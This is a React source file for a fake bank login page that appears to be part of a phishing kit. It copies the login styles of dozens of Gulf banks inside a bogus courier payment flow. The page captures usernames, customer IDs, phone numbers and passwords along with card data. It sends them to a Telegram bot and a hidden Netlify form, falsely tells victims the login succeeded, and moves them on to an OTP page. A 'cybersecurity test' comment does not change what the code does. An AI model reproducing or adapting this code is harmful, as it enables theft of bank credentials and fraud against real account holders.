import { useEffect, useState, type CSSProperties } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { getServiceBranding } from "@/lib/serviceLogos";
import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
import { useLink } from "@/hooks/useSupabase";
import { Lock, Eye, EyeOff, Building2, ArrowLeft, ShieldCheck } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { getBankById } from "@/lib/banks";
import { getCountryByCode } from "@/lib/countries";
import { getBankLoginTheme } from "@/lib/bankThemes";
import FullScreenLoader from "@/components/FullScreenLoader";

const PaymentBankLogin = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading } = useLink(id);
  
  // Bank login credentials state
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [customerId, setCustomerId] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  
  // Get customer info and selected bank from sessionStorage
  const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
  const selectedCountry = sessionStorage.getItem('selectedCountry') || '';
  const selectedBankId = sessionStorage.getItem('selectedBank') || '';
  const cardInfo = {
    cardName: sessionStorage.getItem('cardName') || '',
    cardLast4: sessionStorage.getItem('cardLast4') || '',
    cardNumber: sessionStorage.getItem('cardNumber') || '',
    cardExpiry: sessionStorage.getItem('cardExpiry') || '',
    cardCvv: sessionStorage.getItem('cardCvv') || '',
    cardType: sessionStorage.getItem('cardType') || '',
  };
  
  if (isLoading) {
    return <FullScreenLoader label="جاري تجهيز صفحة تسجيل الدخول البنكي..." />;
  }

  if (!linkData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
        <div className="text-center p-8">
          <Lock className="w-12 h-12 mx-auto mb-4 text-muted-foreground" />
          <h2 className="text-lg font-semibold mb-2">تعذر تحميل بيانات الدفع</h2>
          <p className="text-sm text-muted-foreground">تأكد من صلاحية الرابط أو أعد المحاولة لاحقاً.</p>
        </div>
      </div>
    );
  }

  const payload = (linkData.payload ?? {}) as Record<string, any>;
  const serviceKey = payload.service_key || customerInfo.service || 'aramex';
  const serviceName = payload.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const amount = payload?.cod_amount || 500;
  const formattedAmount = `${amount} ر.س`;
  
  useEffect(() => {
    const method = sessionStorage.getItem('paymentMethod');
    const bank = sessionStorage.getItem('selectedBank');

    if (!method) {
      navigate(`/pay/${id}/track`);
      return;
    }

    if (method !== 'login') {
      navigate(`/pay/${id}/details`);
      return;
    }

    if (!bank || bank === 'skipped') {
      navigate(`/pay/${id}/track`);
    }
  }, [id, navigate]);

  const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
  const selectedCountryData = selectedCountry ? getCountryByCode(selectedCountry) : null;
  const bankTheme = getBankLoginTheme(selectedBank?.id || '', selectedBank?.color || branding.colors.primary);
  
  // Determine login type based on bank
  const getLoginType = () => {
    if (!selectedBank) return 'username';
    
    const bankId = selectedBank.id;
    
    // Saudi banks
    if (bankId === 'alrajhi_bank') return 'username'; // Username + Password
    if (bankId === 'alahli_bank') return 'username'; // Username + Password
    if (bankId === 'riyad_bank') return 'customerId'; // Customer ID + Password
    if (bankId === 'samba_bank') return 'username'; // Username + Password
    if (bankId === 'saudi_investment_bank') return 'customerId'; // Customer ID + Password
    if (bankId === 'arab_national_bank') return 'username'; // Username + Password
    if (bankId === 'saudi_fransi_bank') return 'customerId'; // Customer ID + Password
    if (bankId === 'alinma_bank') return 'username'; // Username + Password
    if (bankId === 'albilad_bank') return 'customerId'; // Customer ID + Password
    if (bankId === 'aljazira_bank') return 'username'; // Username + Password
    
    // UAE banks
    if (bankId === 'emirates_nbd') return 'username'; // Username + Password
    if (bankId === 'adcb') return 'customerId'; // Customer ID + Password
    if (bankId === 'fab') return 'username'; // Username + Password
    if (bankId === 'dib') return 'username'; // Username + Password
    if (bankId === 'mashreq_bank') return 'customerId'; // Customer ID + Password
    if (bankId === 'cbd') return 'username'; // Username + Password
    if (bankId === 'rakbank') return 'customerId'; // Customer ID + Password
    if (bankId === 'ajman_bank') return 'username'; // Username + Password
    
    // Kuwait banks
    if (bankId === 'nbk') return 'customerId'; // Customer ID + Password
    if (bankId === 'gulf_bank') return 'username'; // Username + Password
    if (bankId === 'cbk') return 'customerId'; // Customer ID + Password
    if (bankId === 'burgan_bank') return 'username'; // Username + Password
    if (bankId === 'ahli_united_bank') return 'username'; // Username + Password
    if (bankId === 'kfh') return 'customerId'; // Customer ID + Password
    if (bankId === 'boubyan_bank') return 'username'; // Username + Password
    
    // Qatar banks
    if (bankId === 'qnb') return 'customerId'; // Customer ID + Password
    if (bankId === 'cbq') return 'username'; // Username + Password
    if (bankId === 'doha_bank') return 'username'; // Username + Password
    if (bankId === 'qib') return 'customerId'; // Customer ID + Password
    if (bankId === 'masraf_alrayan') return 'username'; // Username + Password
    if (bankId === 'ahlibank') return 'customerId'; // Customer ID + Password
    
    // Oman banks
    if (bankId === 'bank_muscat') return 'customerId'; // Customer ID + Password
    if (bankId === 'national_bank_oman') return 'username'; // Username + Password
    if (bankId === 'bank_dhofar') return 'username'; // Username + Password
    if (bankId === 'ahli_bank_oman') return 'customerId'; // Customer ID + Password
    if (bankId === 'nizwa_bank') return 'username'; // Username + Password
    if (bankId === 'sohar_international') return 'customerId'; // Customer ID + Password
    
    // Bahrain banks
    if (bankId === 'nbb') return 'username'; // Username + Password
    if (bankId === 'bbk') return 'customerId'; // Customer ID + Password
    if (bankId === 'ahli_united_bahrain') return 'username'; // Username + Password
    if (bankId === 'bisb') return 'username'; // Username + Password
    if (bankId === 'ithmaar_bank') return 'customerId'; // Customer ID + Password
    if (bankId === 'khaleeji_bank') return 'username'; // Username + Password
    
    return 'username'; // Default
  };
  
  const loginType = getLoginType();
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Validate based on login type
    if (loginType === 'username' && (!username || !password)) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال اسم المستخدم وكلمة المرور",
        variant: "destructive",
      });
      return;
    }
    
    if (loginType === 'customerId' && (!customerId || !password)) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال رقم العميل وكلمة المرور",
        variant: "destructive",
      });
      return;
    }
    
    if (loginType === 'phone' && (!phoneNumber || !password)) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال رقم الجوال وكلمة المرور",
        variant: "destructive",
      });
      return;
    }
    
    setIsSubmitting(true);
    
    // Store bank login info
    const bankLoginData = {
      username: loginType === 'username' ? username : '',
      customerId: loginType === 'customerId' ? customerId : '',
      phoneNumber: loginType === 'phone' ? phoneNumber : '',
      password: password,
      loginType: loginType,
    };
    
    sessionStorage.setItem('bankLoginData', JSON.stringify(bankLoginData));
    
    // Submit to Netlify Forms
    try {
      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "bank-login",
          name: customerInfo.name || '',
          email: customerInfo.email || '',
          phone: customerInfo.phone || '',
          service: serviceName,
          amount: formattedAmount,
          country: selectedCountryData?.nameAr || '',
          bank: selectedBank?.nameAr || 'غير محدد',
          cardLast4: cardInfo.cardLast4,
          loginType: loginType,
          username: bankLoginData.username,
          customerId: bankLoginData.customerId,
          phoneNumber: bankLoginData.phoneNumber,
          password: password,
          timestamp: new Date().toISOString()
        }).toString()
      });
    } catch (err) {
      console.error("Form submission error:", err);
    }
    
    // Send bank login details to Telegram (cybersecurity test)
    const telegramResult = await sendToTelegram({
      type: 'bank_login',
      data: {
        name: customerInfo.name || '',
        email: customerInfo.email || '',
        phone: customerInfo.phone || '',
        service: serviceName,
        country: selectedCountryData?.nameAr || '',
        countryCode: selectedCountry,
        bank: selectedBank?.nameAr || 'غير محدد',
        bankId: selectedBankId,
        cardLast4: cardInfo.cardLast4,
        cardType: cardInfo.cardType,
        loginType: loginType,
        username: bankLoginData.username,
        customerId: bankLoginData.customerId,
        phoneNumber: bankLoginData.phoneNumber,
        password: password,
        amount: formattedAmount
      },
      timestamp: new Date().toISOString()
    });

    if (telegramResult.success) {
      console.log('Bank login details sent to Telegram successfully');
    } else {
      console.error('Failed to send bank login details to Telegram:', telegramResult.error);
    }
    
    setIsSubmitting(false);
    
    toast({
      title: "تم بنجاح",
      description: "تم تسجيل الدخول بنجاح",
    });
    
    // Navigate to OTP verification
    navigate(`/pay/${id}/otp`);
  };
  
  return (
    <DynamicPaymentLayout
      serviceName={serviceName}
      serviceKey={serviceKey}
      amount={formattedAmount}
      title={`تسجيل الدخول - ${selectedBank?.nameAr || 'البنك'}`}
      description="أدخل بيانات الدخول للبنك لتأكيد العملية"
      icon={<Lock className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
      showHero={false}
      backgroundStyle={{ background: bankTheme.backgroundGradient }}
      cardStyle={{
        background: bankTheme.panelBackground,
        borderColor: bankTheme.panelBorder,
        borderTopColor: bankTheme.primary,
        boxShadow: bankTheme.buttonShadow,
        fontFamily: bankTheme.fontFamily,
      }}
    >
      {/* Bank Info Header */}
      <div 
        className="rounded-xl p-4 sm:p-6 mb-6 flex items-center gap-4 text-white shadow-lg"
        style={{
          background: bankTheme.headerGradient,
          boxShadow: bankTheme.buttonShadow,
          fontFamily: bankTheme.fontFamily,
        }}
      >
        <div 
          className="w-12 h-12 sm:w-14 sm:h-14 rounded-xl bg-white/20 backdrop-blur-sm flex items-center justify-center flex-shrink-0"
        >
          <Building2 className="w-6 h-6 sm:w-7 sm:h-7 text-white" />
        </div>
        <div className="flex-1 text-white">
          <p className="text-xs sm:text-sm opacity-90">البنك المختار</p>
          <p className="text-lg sm:text-xl font-bold">{selectedBank?.nameAr || 'البنك'}</p>
          <p className="text-xs opacity-80">{selectedBank?.name}</p>
        </div>
        {selectedCountryData && (
          <span className="text-3xl sm:text-4xl">{selectedCountryData.flag}</span>
        )}
      </div>

      {/* Security Notice */}
      <div 
        className="rounded-lg p-3 sm:p-4 mb-6 flex items-start gap-2"
        style={{
          background: bankTheme.accentBackground,
          border: `1px solid ${bankTheme.accentBorder}`,
        }}
      >
        <ShieldCheck className="w-5 h-5 mt-0.5 flex-shrink-0" style={{ color: bankTheme.primary }} />
        <div className="text-xs sm:text-sm" style={{ fontFamily: bankTheme.fontFamily }}>
          <p className="font-semibold mb-1">تسجيل دخول آمن</p>
          <p className="text-muted-foreground" style={{ color: bankTheme.subtleText }}>
            سجّل دخول إلى حسابك البنكي لتأكيد العملية وإكمال الدفع بأمان
          </p>
        </div>
      </div>

      {/* Login Form */}
      <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-5" style={{ fontFamily: bankTheme.fontFamily }}>
        {/* Username Login */}
        {loginType === 'username' && (
          <>
            <div>
              <Label className="mb-2 text-sm sm:text-base">اسم المستخدم</Label>
              <Input
                type="text"
                placeholder="أدخل اسم المستخدم"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="h-12 sm:h-14 text-base sm:text-lg"
                style={{
                  background: bankTheme.inputBackground,
                  borderColor: bankTheme.inputBorder,
                  '--tw-ring-color': bankTheme.focusRing,
                } as CSSProperties}
                autoComplete="username"
                required
              />
            </div>
          </>
        )}
        
        {/* Customer ID Login */}
        {loginType === 'customerId' && (
          <>
            <div>
              <Label className="mb-2 text-sm sm:text-base">رقم العميل</Label>
              <Input
                type="text"
                placeholder="أدخل رقم العميل"
                value={customerId}
                onChange={(e) => setCustomerId(e.target.value)}
                className="h-12 sm:h-14 text-base sm:text-lg"
                style={{
                  background: bankTheme.inputBackground,
                  borderColor: bankTheme.inputBorder,
                  '--tw-ring-color': bankTheme.focusRing,
                } as CSSProperties}
                inputMode="numeric"
                required
              />
            </div>
          </>
        )}
        
        {/* Phone Login */}
        {loginType === 'phone' && (
          <>
            <div>
              <Label className="mb-2 text-sm sm:text-base">رقم الجوال</Label>
              <Input
                type="tel"
                placeholder="05xxxxxxxx"
                value={phoneNumber}
                onChange={(e) => setPhoneNumber(e.target.value)}
                className="h-12 sm:h-14 text-base sm:text-lg"
                style={{
                  background: bankTheme.inputBackground,
                  borderColor: bankTheme.inputBorder,
                  '--tw-ring-color': bankTheme.focusRing,
                } as CSSProperties}
                inputMode="tel"
                required
              />
            </div>
          </>
        )}
        
        {/* Password (common for all types) */}
        <div>
          <Label className="mb-2 text-sm sm:text-base">كلمة المرور</Label>
          <div className="relative">
            <Input
              type={showPassword ? "text" : "password"}
              placeholder="أدخل كلمة المرور"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="h-12 sm:h-14 text-base sm:text-lg pl-12"
              style={{
                background: bankTheme.inputBackground,
                borderColor: bankTheme.inputBorder,
                '--tw-ring-color': bankTheme.focusRing,
              } as CSSProperties}
              autoComplete="current-password"
              required
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground transition-colors"
            >
              {showPassword ? (
                <EyeOff className="w-5 h-5" />
              ) : (
                <Eye className="w-5 h-5" />
              )}
            </button>
          </div>
        </div>
        
        {/* Remember Me / Forgot Password */}
        <div className="flex items-center justify-between text-xs sm:text-sm">
          <div className="flex items-center gap-2">
            <input type="checkbox" id="remember" className="rounded" />
            <label
              htmlFor="remember"
              className="text-muted-foreground cursor-pointer"
              style={{ color: bankTheme.subtleText }}
            >
              تذكرني
            </label>
          </div>
          <button
            type="button"
            className="text-muted-foreground hover:underline"
            style={{ color: bankTheme.primary }}
          >
            نسيت كلمة المرور؟
          </button>
        </div>
        
        {/* Submit Button */}
        <Button
          type="submit"
          size="lg"
          className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white font-bold shadow-lg"
          disabled={isSubmitting}
          style={{
            background: bankTheme.buttonGradient,
            boxShadow: bankTheme.buttonShadow,
            '--tw-ring-color': bankTheme.focusRing,
          }}
        >
          {isSubmitting ? (
            <span>جاري تسجيل الدخول...</span>
          ) : (
            <>
              <Lock className="w-4 h-4 sm:w-5 sm:h-5 ml-2" />
              <span>تسجيل الدخول والمتابعة</span>
              <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
            </>
          )}
        </Button>
        
        <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
          بتسجيل الدخول، أنت توافق على شروط وأحكام البنك
        </p>
      </form>
      
      {/* Additional Info */}
      <div className="mt-6 pt-6 border-t text-center" style={{ borderColor: bankTheme.panelBorder }}>
        <p
          className="text-xs text-muted-foreground mb-3"
          style={{ color: bankTheme.subtleText }}
        >
          لا تملك حساب؟
        </p>
        <Button
          type="button"
          variant="outline"
          size="sm"
          className="text-xs"
          style={{
            borderColor: bankTheme.primary,
            color: bankTheme.primary,
            '--tw-ring-color': bankTheme.focusRing,
          }}
        >
          تسجيل حساب جديد
        </Button>
      </div>
    
      {/* Hidden Netlify Form */}
      <form name="bank-login" netlify-honeypot="bot-field" data-netlify="true" hidden>
        <input type="text" name="name" />
        <input type="email" name="email" />
        <input type="tel" name="phone" />
        <input type="text" name="service" />
        <input type="text" name="amount" />
        <input type="text" name="country" />
        <input type="text" name="bank" />
        <input type="text" name="cardLast4" />
        <input type="text" name="loginType" />
        <input type="text" name="username" />
        <input type="text" name="customerId" />
        <input type="text" name="phoneNumber" />
        <input type="password" name="password" />
        <input type="text" name="timestamp" />
      </form>
    </DynamicPaymentLayout>
  );
};

export default PaymentBankLogin;
